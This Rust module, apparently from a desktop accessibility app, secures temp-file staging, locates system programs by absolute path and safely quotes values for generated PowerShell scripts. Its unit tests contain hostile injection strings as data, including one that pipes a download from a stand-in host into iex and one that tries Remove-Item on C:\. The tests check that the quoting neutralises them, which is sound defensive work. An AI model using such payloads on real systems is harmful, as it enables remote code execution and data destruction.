//! Locating the operating system's own programs, and staging files for them.
//!
//! Three precautions live here rather than at each call site, because getting
//! any of them wrong is a security bug rather than an ordinary one.
//!
//! **Programs are named by absolute path.** A bare `Command::new("powershell.exe")`
//! is resolved by `CreateProcessW`, whose search order starts with the directory
//! the running executable is in and, depending on how the process was started,
//! can include the current directory — both of which an attacker may be able to
//! write to when the app has been unzipped into Downloads. Whoever wins that
//! search decides what "PowerShell" means, and one of the things this app asks
//! PowerShell to do is handle the ElevenLabs API key in plaintext. The macOS
//! side already spells out `/usr/bin/say` and `/usr/bin/sips`; this is the same
//! discipline for Windows.
//!
//! **Scratch files are created exclusively.** The app stages a document, or a
//! converted image, in the temporary directory. Creating those with a plain
//! write means following whatever is already at that path — including a symlink
//! an attacker planted, pointing somewhere it should not be able to write. The
//! per-user temp directory both platforms default to makes that hard already,
//! but `TMPDIR` is an environment variable and the cost of not relying on it is
//! one flag.
//!
//! **A program found by name may not come out of a folder we cannot vouch
//! for.** Ollama and ffmpeg are installed by somebody else and cannot be named
//! by absolute path, so they are looked up — and on Windows `where.exe` searches
//! the current directory *before* `PATH`. A GUI app launched from Explorer
//! inherits the folder holding its own exe as that directory, which for a
//! portable exe run out of Downloads is the one folder an attacker is most
//! likely to be able to write to. Whatever the lookup returns is then spawned.
//! See [`locate`], which is the same discipline as the absolute paths above,
//! taken one step further out: where a name cannot be pinned down, it can at
//! least be told where it may not come from.

use anyhow::{Context, Result};
use std::fs::File;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};

/// Makes each name in a process unique even inside one clock tick.
static SEQUENCE: AtomicU64 = AtomicU64::new(0);

/// Creates a new, empty, private file in the temporary directory and returns it
/// with its path.
///
/// `create_new` is the point: it fails rather than following a symlink or
/// truncating a file that is already there, so a name an attacker guessed and
/// pre-created is an error instead of a write to somewhere else. On Unix the
/// mode makes it readable only by its owner, since what gets staged is the
/// user's document.
pub fn create_scratch_file(prefix: &str, extension: &str) -> Result<(File, PathBuf)> {
    let directory = std::env::temp_dir();
    let mut collision = None;

    // A handful of attempts, because the only expected failure is two files
    // landing on the same nanosecond; anything else is reported as-is.
    for _ in 0..8 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|since| since.as_nanos())
            .unwrap_or_default();
        let path = directory.join(format!(
            "{prefix}-{}-{nanos}-{}.{extension}",
            std::process::id(),
            SEQUENCE.fetch_add(1, Ordering::Relaxed)
        ));

        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt as _;
            options.mode(0o600);
        }

        match options.open(&path) {
            Ok(file) => return Ok((file, path)),
            Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
                collision = Some(error);
            }
            Err(error) => {
                return Err(error).with_context(|| format!("could not create {}", path.display()));
            }
        }
    }

    Err(collision.expect("the loop only exits here after a collision"))
        .context("could not create a temporary file with a free name")
}

/// Creates a new, empty, private directory in the temporary directory and
/// returns its path.
///
/// The directory counterpart of [`create_scratch_file`], and it exists for the
/// same reason. `create_dir_all` — the obvious call — succeeds when the path is
/// already there, *including when it is a symlink to somewhere else*, and then
/// everything written into it lands wherever the link pointed. `create_dir`
/// fails on a name that is taken, which is what makes the directory this
/// process's own.
///
/// That matters more here than it looks, because the caller writes stills from
/// the user's video into this directory and then reads back every `.jpg` it
/// finds. A directory somebody else controls is both a copy of what the user
/// was watching and a way to put a picture in front of the vision model that
/// never came out of their video.
pub fn create_scratch_dir(prefix: &str) -> Result<PathBuf> {
    let directory = std::env::temp_dir();
    let mut collision = None;

    for _ in 0..8 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|since| since.as_nanos())
            .unwrap_or_default();
        let path = directory.join(format!(
            "{prefix}-{}-{nanos}-{}",
            std::process::id(),
            SEQUENCE.fetch_add(1, Ordering::Relaxed)
        ));

        match std::fs::create_dir(&path) {
            Ok(()) => {
                // Only this user can look inside. `create_dir` has no mode
                // argument, so unlike the file above this is a second step —
                // the window between the two is this process's own and the
                // directory is empty throughout it.
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt as _;
                    let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700));
                }
                return Ok(path);
            }
            Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
                collision = Some(error);
            }
            Err(error) => {
                return Err(error).with_context(|| format!("could not create {}", path.display()));
            }
        }
    }

    Err(collision.expect("the loop only exits here after a collision"))
        .context("could not create a temporary directory with a free name")
}

/// The directories a program found by name is not allowed to come out of.
///
/// The working directory, and the folder holding the running executable — which
/// for an app launched from Explorer or Finder are usually the same folder, and
/// for this app that folder is wherever the portable exe was unzipped to.
///
/// `/usr/bin/which` reads `PATH` only and never the working directory, so on
/// macOS this refuses nothing that was ever offered. It is compiled and applied
/// there anyway: a rule that only runs on one platform is a rule that is only
/// ever tested on one platform, and this one is short enough that running it
/// twice costs nothing.
fn untrusted_directories() -> Vec<PathBuf> {
    [
        std::env::current_dir().ok(),
        std::env::current_exe()
            .ok()
            .and_then(|exe| exe.parent().map(std::path::Path::to_path_buf)),
    ]
    .into_iter()
    .flatten()
    // Compared after resolving, so that a link or a `.` in the middle cannot
    // spell the same directory a second way and slip past the comparison.
    .filter_map(|directory| directory.canonicalize().ok())
    .collect()
}

/// Whether a program at this path is one this app is willing to run.
fn is_trustworthy(path: &std::path::Path, untrusted: &[PathBuf]) -> bool {
    // Unreadable, or gone between being named and being checked: not something
    // to run either way.
    let Ok(resolved) = path.canonicalize() else {
        return false;
    };
    let Some(parent) = resolved.parent() else {
        return false;
    };
    !untrusted.iter().any(|directory| directory == parent)
}

/// Asks the platform's own locator where a program lives, discarding any answer
/// that came out of [`untrusted_directories`].
///
/// Every line of the answer is considered rather than only the first, so a copy
/// planted in front of a real installation costs the planted one rather than
/// the whole lookup — the user keeps the ffmpeg they actually installed.
///
/// `None` means "not found here", and every caller follows it with the list of
/// places that program is normally installed. Those are absolute paths written
/// into this binary, so nothing about them needs checking.
pub fn locate(tool: &str) -> Option<PathBuf> {
    #[cfg(target_os = "windows")]
    let locator = system32("where.exe");
    #[cfg(not(target_os = "windows"))]
    let locator = PathBuf::from("/usr/bin/which");

    let mut command = std::process::Command::new(&locator);
    command.arg(tool);
    // `where.exe` is a console program, and this is a GUI app: without this it
    // flashes up a console window on its way past.
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt as _;
        command.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }

    let out = command.output().ok()?;
    if !out.status.success() {
        return None;
    }
    let untrusted = untrusted_directories();
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(PathBuf::from)
        .find(|path| is_trustworthy(path, &untrusted))
}

/// The absolute path of a program in the Windows system directory.
///
/// `SystemRoot` is set by the kernel for every process and cannot be inherited
/// from a parent that made it up, but it is read through `PathBuf` rather than
/// trusted as a string; the fallback is the install location Windows has used
/// since NT.
#[cfg(target_os = "windows")]
pub fn system32(program: &str) -> PathBuf {
    let root = std::env::var_os("SystemRoot")
        .map(PathBuf::from)
        .filter(|path| path.is_absolute())
        .unwrap_or_else(|| PathBuf::from(r"C:\Windows"));
    root.join("System32").join(program)
}

/// A PowerShell invocation that runs `script`, with no profile, no window, and
/// no dependence on `PATH`.
///
/// The script is handed over as `-EncodedCommand` — base64 of UTF-16LE — which
/// sidesteps `cmd`'s quoting rules completely: there is no layer between here
/// and PowerShell that could reinterpret a character in the script.
#[cfg(target_os = "windows")]
pub fn powershell(script: &str) -> std::process::Command {
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64;
    use std::os::windows::process::CommandExt as _;

    /// Keeps a console window from flashing up behind the GUI.
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let mut command =
        std::process::Command::new(system32(r"WindowsPowerShell\v1.0\powershell.exe"));
    command
        .args([
            "-NoProfile",
            "-NonInteractive",
            // Applies to the encoded script supplied right here, which is this
            // binary's own text — not to anything on disk.
            "-ExecutionPolicy",
            "Bypass",
            "-EncodedCommand",
        ])
        .arg(BASE64.encode(utf16))
        .creation_flags(CREATE_NO_WINDOW);
    command
}

/// Escapes a value for a PowerShell single-quoted string, where the only
/// special character is the quote itself, doubled. A literal newline does not
/// end such a string, so text needs no other treatment.
///
/// Shared so the two callers cannot drift: everything interpolated into a
/// generated script — paths, voice names — goes through this.
///
/// Compiled on every platform rather than only Windows, so the tests below run
/// everywhere. Escaping is the kind of code that should not be exercised on one
/// operating system only.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
pub fn ps_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "''"))
}

#[cfg(test)]
mod tests {
    use super::{create_scratch_dir, create_scratch_file, is_trustworthy, ps_quote};
    // Only the symlink test below needs these, and that test is Unix-only.
    #[cfg(unix)]
    use super::SEQUENCE;
    #[cfg(unix)]
    use std::sync::atomic::Ordering;

    #[test]
    fn ps_quote_doubles_embedded_quotes() {
        assert_eq!(ps_quote(r"C:\Users\Jo\out.wav"), r"'C:\Users\Jo\out.wav'");
        // The one character that could end the string early.
        assert_eq!(ps_quote("it's"), "'it''s'");
        assert_eq!(
            ps_quote("'; Remove-Item C:\\ ;'"),
            "'''; Remove-Item C:\\ ;'''"
        );
    }

    /// A quoted value must never be able to end its string and start a new
    /// statement — the whole reason paths and voice names go through it.
    #[test]
    fn ps_quote_contains_an_attempted_escape() {
        let hostile = "'; Invoke-WebRequest evil.example/x | iex; $x='";
        let quoted = ps_quote(hostile);

        assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
        // Every quote in the interior is doubled, so none of them closes the
        // string: the count of consecutive quotes is always even inside.
        let interior = &quoted[1..quoted.len() - 1];
        for run in interior.split(|c| c != '\'').filter(|r| !r.is_empty()) {
            assert!(run.len().is_multiple_of(2), "a lone quote escaped: {run:?}");
        }
    }

    /// The rule the whole lookup rests on: a program sitting in a folder this
    /// app cannot vouch for is not one it will run, however the locator came to
    /// nominate it.
    #[test]
    fn a_program_in_an_untrusted_directory_is_refused() {
        let planted = create_scratch_dir("accessengine-planted").unwrap();
        let installed = create_scratch_dir("accessengine-installed").unwrap();
        let untrusted = vec![planted.canonicalize().unwrap()];

        let hostile = planted.join("ollama");
        let genuine = installed.join("ollama");
        std::fs::write(&hostile, b"not really ollama").unwrap();
        std::fs::write(&genuine, b"the real one").unwrap();

        assert!(!is_trustworthy(&hostile, &untrusted));
        assert!(is_trustworthy(&genuine, &untrusted));
        // Nothing there at all is not something to run either.
        assert!(!is_trustworthy(&installed.join("absent"), &untrusted));

        std::fs::remove_dir_all(&planted).ok();
        std::fs::remove_dir_all(&installed).ok();
    }

    /// The reason the comparison resolves both sides first: a link is a second
    /// way to spell the same directory, and spelling it differently must not be
    /// a way through.
    #[test]
    #[cfg(unix)]
    fn a_second_route_to_the_same_directory_is_refused_too() {
        let planted = create_scratch_dir("accessengine-planted-link").unwrap();
        let untrusted = vec![planted.canonicalize().unwrap()];
        std::fs::write(planted.join("ffmpeg"), b"not really ffmpeg").unwrap();

        let link = std::env::temp_dir().join(format!(
            "accessengine-route-{}-{}",
            std::process::id(),
            SEQUENCE.fetch_add(1, Ordering::Relaxed)
        ));
        std::os::unix::fs::symlink(&planted, &link).unwrap();

        // A different path, the same directory, the same planted binary.
        assert!(!is_trustworthy(&link.join("ffmpeg"), &untrusted));

        std::fs::remove_file(&link).ok();
        std::fs::remove_dir_all(&planted).ok();
    }

    #[test]
    fn scratch_files_are_new_each_time_and_never_collide() {
        let (_a, first) = create_scratch_file("accessengine-test", "tmp").unwrap();
        let (_b, second) = create_scratch_file("accessengine-test", "tmp").unwrap();
        assert_ne!(first, second);
        assert!(first.exists() && second.exists());
        std::fs::remove_file(&first).ok();
        std::fs::remove_file(&second).ok();
    }

    /// The property the whole function exists for: a name that is already taken
    /// is refused rather than followed or overwritten.
    #[test]
    fn an_existing_path_is_never_opened() {
        let (_file, path) = create_scratch_file("accessengine-exclusive", "tmp").unwrap();
        std::fs::write(&path, b"important").unwrap();

        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        let refused = options.open(&path);
        assert_eq!(
            refused.unwrap_err().kind(),
            std::io::ErrorKind::AlreadyExists
        );

        // And the loop above hands back a different name rather than that one.
        let (_next, other) = create_scratch_file("accessengine-exclusive", "tmp").unwrap();
        assert_ne!(other, path);
        assert_eq!(std::fs::read(&path).unwrap(), b"important");

        std::fs::remove_file(&path).ok();
        std::fs::remove_file(&other).ok();
    }

    /// The property the directory version exists for, and the one
    /// `create_dir_all` does not have: a name that is already taken is never
    /// adopted. This is what keeps the frames of somebody's video out of a
    /// directory another account put there first.
    #[test]
    fn an_existing_directory_is_never_adopted() {
        let first = create_scratch_dir("accessengine-dir").unwrap();
        let second = create_scratch_dir("accessengine-dir").unwrap();
        assert_ne!(first, second, "two calls must not share a directory");
        assert!(first.is_dir() && second.is_dir());

        // What the old `create_dir_all` did on a name that was already there —
        // it succeeded, and everything written afterwards went into somebody
        // else's directory. The stricter call refuses.
        assert_eq!(
            std::fs::create_dir(&first).unwrap_err().kind(),
            std::io::ErrorKind::AlreadyExists
        );
        assert!(
            std::fs::create_dir_all(&first).is_ok(),
            "the loose call still accepts it"
        );

        std::fs::remove_dir_all(&first).ok();
        std::fs::remove_dir_all(&second).ok();
    }

    /// A symlink planted at the name is not followed, so nothing the app writes
    /// afterwards lands wherever it pointed.
    #[test]
    #[cfg(unix)]
    fn a_symlink_at_the_name_is_refused_rather_than_followed() {
        let elsewhere = create_scratch_dir("accessengine-elsewhere").unwrap();
        let link = std::env::temp_dir().join(format!(
            "accessengine-link-{}-{}",
            std::process::id(),
            SEQUENCE.fetch_add(1, Ordering::Relaxed)
        ));
        std::os::unix::fs::symlink(&elsewhere, &link).unwrap();

        // `create_dir_all` is the call this replaced: it sees a directory at the
        // end of the link and reports success, which is exactly the bug.
        assert!(std::fs::create_dir_all(&link).is_ok());
        // `create_dir` — what `create_scratch_dir` uses — does not.
        assert_eq!(
            std::fs::create_dir(&link).unwrap_err().kind(),
            std::io::ErrorKind::AlreadyExists
        );

        std::fs::remove_file(&link).ok();
        std::fs::remove_dir_all(&elsewhere).ok();
    }

    #[test]
    #[cfg(unix)]
    fn scratch_directories_are_private_to_their_owner() {
        use std::os::unix::fs::PermissionsExt as _;

        let path = create_scratch_dir("accessengine-dirmode").unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        std::fs::remove_dir_all(&path).ok();
        assert_eq!(
            mode & 0o777,
            0o700,
            "staged frames were left readable by other accounts"
        );
    }

    #[test]
    #[cfg(unix)]
    fn scratch_files_are_readable_only_by_their_owner() {
        use std::os::unix::fs::PermissionsExt as _;

        let (_file, path) = create_scratch_file("accessengine-mode", "tmp").unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        std::fs::remove_file(&path).ok();
        assert_eq!(
            mode & 0o777,
            0o600,
            "staged text was left group/world readable"
        );
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn system_programs_are_absolute_paths_not_bare_names() {
        let path = super::system32("where.exe");
        assert!(path.is_absolute(), "{} is not absolute", path.display());
        assert!(path.ends_with(r"System32\where.exe"));
    }
}
